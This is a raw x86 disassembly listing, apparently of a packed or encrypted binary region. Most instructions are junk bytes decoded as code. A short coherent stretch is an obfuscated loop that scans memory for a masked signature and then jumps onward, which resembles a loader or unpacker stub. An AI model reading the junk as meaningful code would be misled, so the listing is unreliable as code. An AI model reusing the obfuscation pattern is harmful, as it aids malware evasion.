  40bf34:	dec    ebx
  40bf35:	mov    al,0x24
  40bf37:	daa    
  40bf38:	das    
  40bf39:	pop    ss
  40bf3a:	xor    al,0xdf
  40bf3c:	and    al,0xac
  40bf3e:	mov    esp,esp
  40bf40:	or     al,ch
  40bf42:	addr16 mov eax,ds:0x56a0
  40bf46:	fdivr  DWORD PTR [esi+ebx*1-0x70]
  40bf4a:	add    BYTE PTR [ebx-0x3568ca70],cl
  40bf50:	data16 sahf 
  40bf52:	inc    esi
  40bf53:	ins    BYTE PTR es:[edi],dx
  40bf54:	aaa    
  40bf55:	inc    edi
  40bf56:	cvtdq2ps xmm7,xmm2
  40bf59:	cmp    BYTE PTR [ebx+eiz*8],bl
  40bf5c:	sub    ch,BYTE PTR [edx-0x5e]
  40bf5f:	and    BYTE PTR [eax+0x28eb1a9],dl
  40bf65:	xchg   BYTE PTR [ebx+0x1e71a5f6],bl
  40bf6b:	dec    ebx
  40bf6c:	nop
  40bf6d:	loop   0x40bf0e
  40bf6f:	enter  0x5d0,0x93
  40bf73:	cmc    
  40bf74:	cmp    al,0x4
  40bf76:	push   esi
  40bf77:	aas    
  40bf78:	sbb    edx,ecx
  40bf7a:	sbb    eax,0x82209f53
  40bf7f:	pop    edi
  40bf80:	sbb    dh,BYTE PTR ds:0x261bd522
  40bf86:	sbb    BYTE PTR [ebp-0x65],cl
  40bf89:	push   ds
  40bf8a:	jne    0x40bfcd
  40bf8c:	jmp    0xe3d72c89
  40bf91:	sub    DWORD PTR [edx-0x345357c3],ebp
  40bf97:	pop    es
  40bf98:	in     al,0x24
  40bf9a:	sar    BYTE PTR [eax+0x3c],1
  40bf9d:	sbb    BYTE PTR [esi+0x795e0481],0x44
  40bfa4:	dec    ebx
  40bfa5:	mov    ds:0xa23197c4,eax
  40bfaa:	aam    0xb9
  40bfac:	cmp    eax,0xba7ad38
  40bfb1:	jae    0x40bfb0
  40bfb3:	fild   QWORD PTR [edi+eax*4-0x9]
  40bfb7:	push   ebp
  40bfb8:	pop    esi
  40bfb9:	mov    cl,bl
  40bfbb:	(bad)  
  40bfbd:	shr    cl,1
  40bfbf:	repnz inc eax
  40bfc1:	daa    
  40bfc2:	push   edi
  40bfc3:	xchg   esp,eax
  40bfc4:	scas   eax,DWORD PTR es:[edi]
  40bfc5:	pop    edi
  40bfc6:	xor    ebx,DWORD PTR [esi+0x45]
  40bfc9:	mov    bh,0x88
  40bfcb:	add    al,0x9e
  40bfcd:	sbb    al,0xb5
  40bfcf:	scas   al,BYTE PTR es:[edi]
  40bfd0:	adc    ebx,DWORD PTR [esi]
  40bfd2:	stos   BYTE PTR es:[edi],al
  40bfd3:	cld    
  40bfd4:	mov    ebx,0xf55ce2c2
  40bfd9:	(bad)  
  40bfda:	int    0x4f
  40bfdc:	fisttp WORD PTR ds:0x8cfee77a
  40bfe2:	push   cs
  40bfe3:	je     0x40c00a
  40bfe5:	mov    edi,0x4c26229e
  40bfea:	inc    ebx
  40bfeb:	mov    ?,WORD PTR [edi]
  40bfed:	pop    ebx
  40bfee:	icebp  
  40bfef:	shl    BYTE PTR [ebx],0x35
  40bff2:	(bad)  
  40bff5:	inc    eax
  40bff6:	push   ss
  40bff7:	nop
  40bff8:	test   eax,0x7882da2f
  40bffd:	popa   
  40bffe:	retf   0x7ae8
  40c001:	ds out dx,eax
  40c003:	daa    
  40c004:	mov    al,ds:0x187dad2c
  40c009:	mov    ds:0xf98cd7de,eax
  40c00e:	cwde   
  40c00f:	(bad)  
  40c010:	mov    edx,0x9972ff52
  40c015:	add    eax,0xd9317bd5
  40c01a:	jne    0x40c05e
  40c01c:	fld    QWORD PTR [esi-0x1a24fc5c]
  40c022:	pop    es
  40c023:	retf   
  40c024:	dec    ebp
  40c025:	or     eax,0x1a86615d
  40c02a:	mov    al,ds:0x10411e43
  40c02f:	out    dx,al
  40c030:	inc    ebx
  40c031:	mov    ch,0x88
  40c033:	cmp    ebx,DWORD PTR fs:[eax+0x72c4f823]
  40c03a:	dec    edx
  40c03b:	enter  0x5557,0x46
  40c03f:	adc    esi,DWORD PTR [ebx]
  40c041:	adc    BYTE PTR [edx+0x4c977c4],bl
  40c047:	idiv   BYTE PTR [edi+0x34fb195a]
  40c04d:	fsub   DWORD PTR [edi]
  40c04f:	repz out dx,al
  40c051:	mov    ds:0xbd71baa1,eax
  40c056:	push   ss
  40c057:	mov    DWORD PTR [ebx+0x1d],esp
  40c05a:	or     BYTE PTR [ebx-0x23],bl
  40c05d:	mov    al,ds:0xee48b054
  40c062:	and    BYTE PTR [eax-0x361aeae4],dh
  40c068:	mov    edx,0x86bccee6
  40c06d:	fstp   QWORD PTR [esi]
  40c06f:	imul   eax,edx,0x5
  40c072:	std    
  40c073:	mov    edx,0x34ff0282
  40c078:	imul   ebx,DWORD PTR [esi],0xffffffc5
  40c07b:	mov    ah,0xe6
  40c07d:	movq   mm6,mm0
  40c080:	pushf  
  40c081:	inc    ebx
  40c082:	mov    bl,0xe3
  40c084:	xor    edi,DWORD PTR [eax]
  40c086:	inc    esp
  40c087:	(bad)  
  40c088:	sar    BYTE PTR [esi-0xbcc807d],1
  40c08e:	shr    DWORD PTR [edx+0x16],0x7
  40c092:	jmp    0x53a1534c
  40c097:	and    eax,0x289b076
  40c09c:	stos   BYTE PTR es:[edi],al
  40c09d:	pop    edx
  40c09e:	dec    esi
  40c09f:	sti    
  40c0a0:	sub    al,0x32
  40c0a2:	or     eax,0x82192d2d
  40c0a7:	or     dh,cl
  40c0a9:	hlt    
  40c0aa:	inc    esi
  40c0ab:	into   
  40c0ac:	sbb    BYTE PTR [esi-0x2b],ch
  40c0af:	jle    0x40c088
  40c0b1:	neg    BYTE PTR [edi]
  40c0b3:	call   0x20ca:0x777b1e60
  40c0ba:	and    al,0x18
  40c0bc:	jae    0x40c116
  40c0be:	xor    DWORD PTR [edx+0x1c788a72],ebx
  40c0c4:	mov    al,ds:0x1c4513a4
  40c0c9:	cli    
  40c0ca:	jmp    0x40c0c3
  40c0cc:	xchg   ebx,eax
  40c0cd:	lea    ebp,[edx-0x2c7c383d]
  40c0d3:	sub    dh,BYTE PTR ds:0xb8074bea
  40c0d9:	push   esp
  40c0da:	mov    al,ds:0xd3a2c7f5
  40c0df:	mov    ch,0x73
  40c0e1:	mov    ebp,0xa1420100
  40c0e6:	xchg   esi,eax
  40c0e7:	(bad)  
  40c0e8:	pop    ebx
  40c0e9:	xor    al,0xef
  40c0eb:	(bad)  
  40c0ec:	adc    DWORD PTR [ebx],esi
  40c0ee:	test   BYTE PTR gs:[esi],ch
  40c0f1:	(bad)  
  40c0f2:	loope  0x40c164
  40c0f4:	jnp    0x40c08f
  40c0f6:	or     esi,DWORD PTR [esp+ecx*8+0x56]
  40c0fa:	xor    bl,BYTE PTR [edx+edi*4+0x62eaa35a]
  40c101:	and    DWORD PTR [esi+0x73ee194a],ebp
  40c107:	(bad)  
  40c108:	fmul   DWORD PTR [eax+0x4f0bdbf2]
  40c10e:	dec    edx
  40c10f:	jmp    0x925c:0x7397c84e
  40c116:	fdivr  QWORD PTR [ecx+eax*4+0x45]
  40c11a:	inc    ebx
  40c11b:	push   ds
  40c11c:	sbb    eax,0xa4cddb3a
  40c121:	(bad)  
  40c122:	ror    ah,0xe9
  40c125:	mov    ebx,0x37b1109c
  40c12a:	lock sbb ax,0x5d3d
  40c12f:	jge    0x40c113
  40c131:	fs loop 0x40c0e4
  40c134:	xchg   esp,eax
  40c135:	mov    esi,0xab06edd0
  40c13a:	push   0xe4e32736
  40c13f:	not    BYTE PTR [si+0x6e6]
  40c144:	mov    ebx,0x4069979f
  40c149:	dec    ebx
  40c14a:	and    al,0xab
  40c14d:	lock push ss
  40c14f:	sub    al,0x53
  40c151:	xor    ah,BYTE PTR ds:0x92a048f3
  40c157:	xchg   DWORD PTR [ecx],edx
  40c159:	pop    edx
  40c15a:	ret    0xae62
  40c15d:	mov    ecx,0x3d7ae69d
  40c162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c163:	test   al,0xe1
  40c165:	aad    0x2a
  40c167:	sub    BYTE PTR [ebx-0x48],ch
  40c16a:	(bad)  
  40c16b:	push   esi
  40c16d:	enter  0x82d0,0x7d
  40c171:	lods   al,BYTE PTR ds:[esi]
  40c172:	push   ebp
  40c173:	jle    0x40c1b4
  40c175:	push   eax
  40c176:	mov    esi,0xb2778c70
  40c17b:	xchg   ecx,eax
  40c17c:	xor    dh,BYTE PTR [edx+0x2c]
  40c17f:	push   es
  40c180:	dec    ebp
  40c181:	iret   
  40c182:	inc    eax
  40c183:	inc    esi
  40c184:	mov    al,0x8b
  40c186:	div    DWORD PTR [edx+ebx*2-0x5e5644f8]
  40c18d:	sbb    al,BYTE PTR [esi]
  40c18f:	in     eax,dx
  40c190:	dec    esi
  40c191:	sbb    al,0xc9
  40c193:	rol    BYTE PTR [ebp+0x48],cl
  40c196:	add    DWORD PTR [edi+0x381ad1cf],ebx
  40c19c:	and    bl,ah
  40c19e:	jg     0x40c12a
  40c1a0:	cmc    
  40c1a1:	lods   eax,DWORD PTR ds:[esi]
  40c1a2:	mov    edx,0x8e183b8d
  40c1a7:	and    al,0x5e
  40c1a9:	xlat   BYTE PTR ds:[ebx]
  40c1aa:	mov    ds:0xec98b1e0,al
  40c1af:	mov    ah,0x94
  40c1b1:	sbb    bh,BYTE PTR [esi-0x2378e79b]
  40c1b7:	cmp    DWORD PTR [eax],edx
  40c1b9:	out    0x35,eax
  40c1bb:	stos   DWORD PTR es:[edi],eax
  40c1bc:	push   esi
  40c1bd:	(bad)  
  40c1be:	call   0x7d93bd95
  40c1c3:	inc    ecx
  40c1c4:	adc    al,BYTE PTR [ebp+0x2cd37cbb]
  40c1ca:	push   ds
  40c1cb:	xchg   ecx,eax
  40c1cc:	add    al,0xaa
  40c1ce:	dec    esi
  40c1cf:	ror    BYTE PTR [ebx-0x16],1
  40c1d2:	jl     0x40c1e1
  40c1d4:	test   BYTE PTR [ebx+0x1c2fe498],dh
  40c1da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1db:	aaa    
  40c1dc:	and    dl,al
  40c1de:	adc    BYTE PTR [edx+0x555e03d1],bh
  40c1e4:	retf   
  40c1e5:	mov    ah,dl
  40c1e7:	mov    ds:0x20ae293b,eax
  40c1ec:	aad    0x73
  40c1ee:	clc    
  40c1ef:	ret    0x917c
  40c1f2:	push   es
  40c1f3:	je     0x40c1fa
  40c1f5:	int    0x74
  40c1f7:	push   ss
  40c1f8:	or     eax,0x1f2cefc0
  40c1fd:	pop    es
  40c1fe:	xchg   ebp,eax
  40c1ff:	jbe    0x40c1a1
  40c201:	jle    0x40c20d
  40c203:	pop    edx
  40c204:	cwde   
  40c205:	das    
  40c206:	mov    dl,0x1a
  40c208:	enter  0xa602,0x20
  40c20c:	mov    ds:0x375e630b,eax
  40c211:	dec    ebx
  40c212:	mov    ch,0xd6
  40c214:	sub    DWORD PTR [ebp+0x51],esi
  40c217:	mov    ds:0xef69b9f3,al
  40c21c:	fwait
  40c21d:	mov    bh,0xe1
  40c21f:	stos   BYTE PTR es:[edi],al
  40c220:	adc    cl,cl
  40c222:	jecxz  0x40c201
  40c224:	mov    edx,0xa799e426
  40c229:	cld    
  40c22a:	add    eax,0x3444a9ec
  40c22f:	aaa    
  40c230:	xchg   edx,eax
  40c231:	rol    ebp,0x5e
  40c234:	mov    DWORD PTR [ebx-0x67],esi
  40c237:	scas   al,BYTE PTR es:[edi]
  40c238:	jns    0x40c293
  40c23a:	ins    DWORD PTR es:[edi],dx
  40c23b:	fld    DWORD PTR [ecx+0x52]
  40c23e:	add    al,0x88
  40c240:	imul   ebx,edx,0xffffffef
  40c243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c244:	(bad)  
  40c245:	cdq    
  40c246:	inc    ecx
  40c247:	mov    bl,0x6f
  40c249:	mov    al,0x31
  40c24b:	xor    al,0xbc
  40c24d:	fsub   DWORD PTR [esp+ebx*2+0x1f]
  40c251:	add    eax,0xbaf78d75
  40c256:	cmc    
  40c257:	aad    0x82
  40c259:	pop    esi
  40c25a:	iret   
  40c25b:	adc    al,0x42
  40c25d:	js     0x40c2da
  40c25f:	(bad)  
  40c260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c261:	or     esp,DWORD PTR [ebx-0xd]
  40c264:	inc    esi
  40c265:	outs   dx,BYTE PTR cs:[esi]
  40c267:	mov    ds:0xa948a970,al
  40c26c:	push   esi
  40c26d:	push   edi
  40c26e:	sbb    ah,BYTE PTR [edi]
  40c270:	shl    bh,cl
  40c272:	dec    edx
  40c273:	push   0x1d
  40c275:	jecxz  0x40c21b
  40c277:	pop    edx
  40c278:	mov    eax,0x93b7a0de
  40c27d:	(bad)  
  40c27e:	call   0x1660:0x79051ed4
  40c285:	pushf  
  40c286:	ret    0xfd72
  40c289:	push   edi
  40c28a:	test   eax,0x713513ca
  40c28f:	mov    bl,0xa9
  40c291:	pop    es
  40c292:	xchg   ebx,eax
  40c293:	stc    
  40c294:	xchg   esp,eax
  40c295:	or     bl,bh
  40c297:	adc    bl,BYTE PTR [edx+ecx*8-0x7bbb93cc]
  40c29e:	mov    bh,0x89
  40c2a0:	jb     0x40c23a
  40c2a2:	adc    ebp,edx
  40c2a4:	popf   
  40c2a5:	adc    al,0xd9
  40c2a7:	mov    ch,0x68
  40c2a9:	add    DWORD PTR [esi],esi
  40c2ab:	xchg   edx,eax
  40c2ac:	xchg   ebp,eax
  40c2ad:	iret   
  40c2ae:	dec    esi
  40c2af:	push   es
  40c2b0:	xchg   ebx,eax
  40c2b1:	jo     0x40c30d
  40c2b3:	add    bh,BYTE PTR [ebx+0x3b]
  40c2b6:	arpl   cx,cx
  40c2b8:	cmp    BYTE PTR [edi+0x43],0x50
  40c2bc:	(bad)  
  40c2bd:	aas    
  40c2be:	mov    esi,0x86262531
  40c2c3:	mov    ds:0x56f34e18,eax
  40c2c8:	mov    ds:0x341f87aa,eax
  40c2cd:	xlat   BYTE PTR ds:[ebx]
  40c2ce:	mov    al,0x18
  40c2d0:	jno    0x40c2c6
  40c2d2:	imul   ecx,DWORD PTR [ebp+0x54],0x65
  40c2d6:	in     eax,dx
  40c2d7:	stos   BYTE PTR es:[edi],al
  40c2d8:	inc    ecx
  40c2d9:	mov    es,ebp
  40c2db:	js     0x40c270
  40c2dd:	ss dec ebx
  40c2df:	sbb    DWORD PTR [edi+0x37e66400],ebp
  40c2e5:	mov    edx,0xf47f2928
  40c2ea:	pop    eax
  40c2eb:	jns    0x40c31b
  40c2ed:	jg     0x40c34e
  40c2ef:	iret   
  40c2f0:	cmp    eax,0x490352ee
  40c2f5:	push   edi
  40c2f6:	xchg   ebx,eax
  40c2f7:	add    al,0x26
  40c2f9:	std    
  40c2fa:	fcomip st,st(2)
  40c2fc:	sub    bl,BYTE PTR [edi+0x19]
  40c2ff:	sbb    edi,DWORD PTR [ebx+0x62]
  40c302:	aaa    
  40c303:	out    dx,al
  40c304:	and    esi,DWORD PTR [edx+ebp*1-0xfb076d1]
  40c30b:	mov    WORD PTR [eax-0x61],es
  40c30e:	mov    edi,0x2debc674
  40c313:	(bad)  
  40c314:	cmp    eax,0x45c2e4a1
  40c319:	mov    ah,0x87
  40c31b:	sbb    eax,0x7d482698
  40c321:	cmp    BYTE PTR ds:0x30a8711f,dl
  40c327:	mov    eax,ds:0x22bc6668
  40c32c:	ror    DWORD PTR [eax-0x3b9ec894],0x50
  40c333:	xchg   DWORD PTR [edi-0x7cb8fb8a],eax
  40c339:	push   esi
  40c33a:	jae    0x40c31c
  40c33c:	(bad)  
  40c33d:	mov    edx,0xf87a55d
  40c342:	jne    0x40c37c
  40c344:	sti    
  40c345:	ror    dl,1
  40c347:	jnp    0x40c2d9
  40c349:	mov    al,0x7b
  40c34b:	pop    edx
  40c34c:	sbb    al,0x3f
  40c34e:	jmp    0x9b46:0xed29
  40c354:	inc    ebp
  40c355:	xchg   edx,eax
  40c356:	je     0x40c2db
  40c358:	inc    eax
  40c359:	adc    ebp,DWORD PTR [edx+0x84b6bcf]
  40c35f:	fwait
  40c360:	jl     0x40c390
  40c362:	int3   
  40c363:	pop    eax
  40c364:	push   ebp
  40c365:	xchg   edx,eax
  40c366:	mov    dh,0xf5
  40c368:	xor    al,0xa3
  40c36a:	inc    eax
  40c36b:	mov    DWORD PTR [ebx-0x3e],ebp
  40c36e:	ror    BYTE PTR [esp+eiz*2+0x62c53441],1
  40c375:	scas   al,BYTE PTR es:[edi]
  40c376:	inc    eax
  40c377:	fwait
  40c378:	cmp    al,0xff
  40c37a:	inc    ebp
  40c37b:	lods   al,BYTE PTR ds:[esi]
  40c37c:	int3   
  40c37d:	call   0xcdc685bf
  40c382:	shl    BYTE PTR [esi],cl
  40c384:	inc    ecx
  40c385:	xor    al,0x14
  40c387:	jmp    0xd85b:0x8896e189
  40c38e:	pop    ebp
  40c38f:	pop    ebp
  40c390:	js     0x40c3c2
  40c392:	nop    DWORD PTR [eax-0x5d7cf3bb]
  40c399:	ret    0xcf2e
  40c39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c39d:	mov    bl,0x87
  40c39f:	dec    esi
  40c3a0:	cmp    eax,0xd36a3a9e
  40c3a5:	hlt    
  40c3a6:	inc    ebp
  40c3a7:	or     esi,eax
  40c3a9:	test   al,0x3b
  40c3ab:	jne    0x40c38b
  40c3ad:	and    BYTE PTR [ebp-0x7a],dl
  40c3b0:	sbb    al,0x3a
  40c3b2:	push   0xd30c702f
  40c3b7:	test   BYTE PTR [ebx+eiz*4+0x23e128e7],dl
  40c3be:	(bad)  
  40c3bf:	jle    0x40c39c
  40c3c1:	sub    al,0x76
  40c3c3:	daa    
  40c3c4:	rcl    DWORD PTR [edi],cl
  40c3c6:	sbb    BYTE PTR [eax+0x5fff667a],al
  40c3cc:	gs nop
  40c3ce:	add    BYTE PTR [ebx],al
  40c3d0:	xor    DWORD PTR [esi+0x4afe7698],ebx
  40c3d6:	std    
  40c3d7:	ficom  WORD PTR [ebp-0x10]
  40c3da:	pop    esp
  40c3db:	push   0x8290dcdd
  40c3e0:	fimul  DWORD PTR [ebx-0x40cc317c]
  40c3e6:	push   esi
  40c3e7:	mov    DWORD PTR [ebp-0x66],ebx
  40c3ea:	pop    edi
  40c3eb:	adc    BYTE PTR [esp+ecx*8-0x1c2ee0a2],0xd0
  40c3f3:	xor    al,0x6
  40c3f5:	or     eax,0xfc2ff761
  40c3fa:	push   0xffffff82
  40c3fc:	fbld   TBYTE PTR [ebx-0x79]
  40c3ff:	push   0x1be5eed2
  40c404:	sbb    DWORD PTR [edi+eiz*1-0x55],ebp
  40c408:	sub    eax,DWORD PTR [ebx]
  40c40a:	or     BYTE PTR [eax*4-0x77f93013],ch
  40c411:	add    eax,0xc8724ebe
  40c416:	jns    0x40c462
  40c418:	lds    ecx,FWORD PTR [edx]
  40c41a:	add    cl,BYTE PTR [edx*4+0x26daf8a6]
  40c421:	int    0x5
  40c423:	arpl   WORD PTR [eax],si
  40c425:	pop    ebx
  40c426:	cs cdq 
  40c428:	mov    ah,0x9b
  40c42a:	not    dh
  40c42c:	outs   dx,BYTE PTR ds:[esi]
  40c42d:	push   0xffffffbd
  40c42f:	enter  0xe00a,0xe7
  40c433:	pop    edi
  40c434:	cmp    eax,0x1691d15c
  40c439:	fidivr WORD PTR [edx-0x3c]
  40c43c:	fdivr  DWORD PTR [eax]
  40c43e:	cdq    
  40c43f:	loope  0x40c3f8
  40c441:	xchg   ebp,eax
  40c442:	and    ch,al
  40c444:	call   0x5182:0xf5cab809
  40c44b:	sub    DWORD PTR [ecx+0x3a88d506],esp
  40c451:	xchg   ecx,eax
  40c452:	jo     0x40c4d3
  40c454:	push   ecx
  40c455:	push   esi
  40c456:	jno    0x40c490
  40c458:	fdiv   st,st(3)
  40c45a:	das    
  40c45b:	ins    BYTE PTR es:[edi],dx
  40c45c:	fidivr DWORD PTR [edx-0x73]
  40c45f:	mov    dh,0xbf
  40c461:	lahf   
  40c462:	pop    ecx
  40c463:	out    dx,al
  40c464:	(bad)  
  40c465:	cmp    ebx,DWORD PTR [esi-0x41]
  40c468:	inc    ebx
  40c469:	retf   
  40c46a:	jle    0x40c4e9
  40c46c:	cmp    bh,al
  40c46e:	pusha  
  40c46f:	rcl    BYTE PTR [edi-0x13e5b609],cl
  40c475:	dec    ebp
  40c476:	iret   
  40c477:	cmp    bh,ch
  40c479:	or     dh,BYTE PTR [esi]
  40c47b:	dec    esi
  40c47c:	cli    
  40c47d:	adc    DWORD PTR [edx-0x11595a7],ebx
  40c483:	cmp    eax,0xb675f67a
  40c488:	je     0x40c4aa
  40c48a:	xor    al,0x35
  40c48c:	fldcw  WORD PTR [ecx-0x13]
  40c48f:	jb     0x40c46e
  40c491:	mov    dl,0x8a
  40c493:	pushf  
  40c494:	fwait
  40c495:	rcr    ah,0x11
  40c498:	push   edi
  40c499:	inc    ecx
  40c49a:	pop    ebp
  40c49b:	and    BYTE PTR [ecx],bl
  40c49d:	sub    ecx,DWORD PTR [edi]
  40c49f:	outs   dx,BYTE PTR ds:[esi]
  40c4a0:	imul   edx,DWORD PTR [esi+0x1fe6247],0xffffffc1
  40c4a7:	(bad)  
  40c4a8:	addr16 sbb esp,0xf3cb243a
  40c4af:	repnz int3 
  40c4b1:	push   ebp
  40c4b2:	sub    ecx,DWORD PTR [ebx-0x4515959b]
  40c4b8:	dec    ebp
  40c4b9:	icebp  
  40c4ba:	dec    edx
  40c4bb:	aam    0xcc
  40c4bd:	fmul   QWORD PTR [edx]
  40c4bf:	dec    esp
  40c4c0:	xchg   edx,eax
  40c4c1:	sub    bl,BYTE PTR ss:[ebp+0x375efa3c]
  40c4c8:	ds int3 
  40c4ca:	push   ss
  40c4cb:	or     dl,BYTE PTR [ecx]
  40c4cd:	pop    esp
  40c4ce:	out    0xd5,al
  40c4d0:	pop    es
  40c4d1:	pop    edi
  40c4d2:	push   ebp
  40c4d3:	fwait
  40c4d4:	sub    al,0x5e
  40c4d6:	pop    ebx
  40c4d7:	(bad)  
  40c4d8:	jp     0x40c4fe
  40c4da:	xor    edx,esi
  40c4dc:	adc    dl,BYTE PTR [eax-0x4a]
  40c4df:	mul    DWORD PTR [ecx-0xea56665]
  40c4e5:	and    BYTE PTR [ebp+0x24],cl
  40c4e8:	xchg   ecx,eax
  40c4e9:	out    0xb9,eax
  40c4eb:	mov    eax,ds:0x1f6bbe5f
  40c4f0:	add    ecx,DWORD PTR [edi-0xb8c29b1]
  40c4f6:	dec    edx
  40c4f7:	jnp    0x40c4e6
  40c4f9:	popf   
  40c4fa:	mov    al,0x97
  40c4fc:	fs (bad) 
  40c4fe:	ins    DWORD PTR es:[edi],dx
  40c4ff:	out    dx,eax
  40c500:	add    ah,BYTE PTR [ebx+eiz*1+0x2fbb0236]
  40c507:	mov    dl,0xaf
  40c509:	xchg   edx,eax
  40c50a:	mov    ebx,0x1482df34
  40c50f:	sar    ebx,1
  40c511:	lea    ecx,[edi-0xc]
  40c514:	or     eax,0x66ecd8c6
  40c519:	outs   dx,DWORD PTR ds:[esi]
  40c51a:	gs and ah,cl
  40c51d:	test   DWORD PTR [ebx+0x5e171a12],ebp
  40c523:	lahf   
  40c524:	mov    edi,0xb25344fa
  40c529:	sub    DWORD PTR ds:[edx+0x1054d02a],ebx
  40c530:	iret   
  40c531:	add    DWORD PTR [ecx],0xa52b4033
  40c537:	add    cl,BYTE PTR [esi]
  40c539:	and    cl,BYTE PTR [esi+ecx*8-0x559c44a7]
  40c540:	add    BYTE PTR [ebp-0x3ff62f3d],0x51
  40c547:	jbe    0x40c509
  40c549:	sub    bh,ch
  40c54b:	push   0xffffffa9
  40c54d:	xlat   BYTE PTR ds:[ebx]
  40c54e:	xchg   ebp,eax
  40c54f:	test   DWORD PTR [esp+edx*8+0x7f],edx
  40c553:	push   cs
  40c554:	fstp   TBYTE PTR [esi-0x76636ec3]
  40c55a:	mov    fs,WORD PTR [esi+0x6d]
  40c55d:	aaa    
  40c55e:	in     al,0x3c
  40c560:	inc    eax
  40c561:	daa    
  40c562:	(bad)  
  40c563:	dec    esi
  40c564:	or     BYTE PTR [eax],bh
  40c566:	adc    ebx,DWORD PTR [edi+eax*8+0x25743490]
  40c56d:	into   
  40c56e:	mov    ebp,0x121a5239
  40c573:	lods   al,BYTE PTR ds:[esi]
  40c574:	cld    
  40c575:	sti    
  40c576:	xor    al,0x59
  40c578:	(bad)  
  40c57a:	xor    BYTE PTR [ebx-0x7f],0xe8
  40c57e:	jae    0x40c552
  40c580:	push   esi
  40c581:	pop    ss
  40c582:	mov    edi,0xfe7222cf
  40c587:	fwait
  40c588:	pop    es
  40c589:	inc    esp
  40c58a:	leave  
  40c58b:	stos   BYTE PTR es:[edi],al
  40c58c:	sbb    ebx,DWORD PTR [edi+0x7d893803]
  40c592:	clc    
  40c593:	mov    eax,DWORD PTR [ebp+0xc]
  40c596:	mov    edi,DWORD PTR [ebp+0xc]
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xac4b873c
  40c65b:	xchg   esi,eax
  40c65c:	xor    BYTE PTR [edx+0x7c7ce0a2],dh
  40c662:	dec    esi
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	stos   DWORD PTR es:[edi],eax
  40c667:	jo     0x40c6b6
  40c669:	(bad)  
  40c66a:	retf   
  40c66b:	add    cl,BYTE PTR [ebp+ebp*4-0x43b228e7]
  40c672:	push   esp
  40c673:	sub    cl,bh
  40c675:	(bad)  
  40c676:	or     esp,edx
  40c678:	bound  ecx,QWORD PTR [edx-0x3b26079c]
  40c67e:	cmp    bl,al
  40c680:	lock push 0x62
  40c683:	ficomp DWORD PTR [esi]
  40c685:	cmc    
  40c686:	lock popa 
  40c688:	mov    cl,0x96
  40c68a:	inc    eax
  40c68b:	outs   dx,BYTE PTR ds:[esi]
  40c68c:	pop    eax
  40c68d:	shr    ebx,1
  40c68f:	ret    0xae6c
  40c692:	ins    BYTE PTR es:[edi],dx
  40c693:	mov    dl,0xd3
  40c695:	ja     0x40c696
  40c697:	pop    ebp
  40c698:	(bad)  
  40c69a:	lock icebp 
  40c69c:	push   es
  40c69d:	sbb    dl,ah
  40c69f:	rcl    edx,cl
  40c6a1:	xchg   BYTE PTR [edi+0x2],dl
  40c6a4:	mov    bl,0x4a
  40c6a6:	fidivr DWORD PTR [ebx-0x7462f3d4]
  40c6ac:	pop    esi
  40c6ad:	lea    ebx,[esi+0x74ea6708]
  40c6b3:	pop    ebx
  40c6b4:	fcmovnb st,st(0)
  40c6b6:	jg     0x40c65d
  40c6b8:	mov    bh,0x7d
  40c6ba:	(bad)  [edx+0x38]
  40c6bd:	or     BYTE PTR [ecx],0x93
  40c6c0:	popf   
  40c6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c2:	add    BYTE PTR [edx-0x79],bh
  40c6c5:	shl    dh,1
  40c6c7:	bound  edx,QWORD PTR [ebx+0x5d24c4bb]
  40c6cd:	add    al,0x0
  40c6cf:	lds    edi,FWORD PTR [eax]
  40c6d1:	or     eax,0xc645acec
  40c6d6:	and    eax,DWORD PTR [ebx]
  40c6d8:	nop    DWORD PTR [ecx+ebp*8-0x2a727d9c]
  40c6e0:	mov    ds:0x3257aa2c,al
